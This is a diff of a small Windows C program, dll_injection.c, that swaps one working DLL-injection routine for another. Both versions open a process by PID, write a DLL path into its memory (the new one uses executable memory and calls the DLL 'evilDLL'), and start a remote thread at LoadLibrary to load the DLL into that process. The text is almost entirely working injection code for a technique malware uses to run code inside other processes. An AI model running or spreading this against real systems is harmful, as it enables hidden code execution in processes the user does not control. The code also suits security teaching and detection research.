@@ -3,55 +3,41 @@
 // x86_64-w64-mingw32-gcc dll_injection.c -o dll_injection.exe
 
 
-#include <windows.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+#include <tlhelp32.h>
 
-int main(int argc, wchar_t* argv[]) {
-    HANDLE processHandle;
-    PVOID remoteBuffer;
-    //const wchar_t dllPath[] = L"C:\\temp\\messagebox.dll";
-    const wchar_t dllPath[] = L"messagebox.dll";
+char evilDLL[] = "C:\\messagebox.dll";
+//char evilDLL[] = "messagebox.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
 
-    if (argc != 2) {
-        wprintf(L"Verwendung: %s <PID>\n", argv[0]);
-        return 1;
-    }
+int main(int argc, char* argv[]) {
+  HANDLE ph; // process handle
+  HANDLE rt; // remote thread
+  LPVOID rb; // remote buffer
 
-    wprintf(L"Injecting DLL to PID: %i\n", _wtoi(argv[1]));
+  // handle to kernel32 and pass it to GetProcAddress
+  HMODULE hKernel32 = GetModuleHandle("Kernel32");
+  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
 
-    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, _wtoi(argv[1]));
-    if (processHandle == NULL) {
-        wprintf(L"Fehler beim Öffnen des Prozesses: %d\n", GetLastError());
-        return 1;
-    }
+  // parse process ID
+  if ( atoi(argv[1]) == 0) {
+      printf("PID not found :( exiting...\n");
+      return -1;
+  }
+  printf("PID: %i", atoi(argv[1]));
+  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
 
-    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
-    if (remoteBuffer == NULL) {
-        wprintf(L"Fehler beim Allozieren von virtuellem Speicher im entfernten Prozess: %d\n", GetLastError());
-        CloseHandle(processHandle);
-        return 1;
-    }
+  // allocate memory buffer for remote process
+  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
-    if (!WriteProcessMemory(processHandle, remoteBuffer, dllPath, sizeof(wchar_t) * (wcslen(dllPath) + 1), NULL)) {
-        wprintf(L"Fehler beim Schreiben im entfernten Prozess: %d\n", GetLastError());
-        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
-        CloseHandle(processHandle);
-        return 1;
-    }
+  // "copy" evil DLL between processes
+  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
 
-    PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
-
-    if (remoteThread == NULL) {
-        wprintf(L"Fehler beim Erstellen des Remote-Threads: %d\n", GetLastError());
-        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
-        CloseHandle(processHandle);
-        return 1;
-    }
-
-    CloseHandle(remoteThread);
-    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
-    CloseHandle(processHandle);
-
-    return 0;
+  // our process start new thread
+  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+  CloseHandle(ph);
+  return 0;
 }
